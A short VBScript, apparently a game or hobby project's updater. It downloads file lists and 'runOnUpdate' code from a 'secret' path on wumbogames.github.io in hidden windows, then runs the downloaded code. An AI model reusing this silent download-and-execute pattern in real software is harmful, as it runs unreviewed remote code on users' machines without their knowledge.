
'This is how you run a vb script from a vb script
Dim script
Set script = Wscript.CreateObject("WScript.shell")

'Make a folder to store everthing
script.run "mkdir files", 0, TRUE

'Get the code we need to run from the internet
'0=Hide window, TRUE=Use same thread 
script.run "helperScripts\CopyFileFromInternet.vbs http://wumbogames.github.io/secret/files.txt files\files.txt", 0, TRUE
script.run "helperScripts\CopyFileFromInternet.vbs http://wumbogames.github.io/secret/runOnUpdate.txt files\runOnUpdate.txt", 0, TRUE
script.run "helperScripts\CopyFileFromInternet.vbs http://wumbogames.github.io/secret/runOnStart.txt files\runOnStart.txt", 0, TRUE

'Get all of the files we need
script.run "helperScripts\CopyAllFiles.vbs files\files.txt", 0, TRUE

'Run the update code
script.run "helperScripts\ExecuteFile.vbs files\runOnUpdate.txt", 0, TRUE
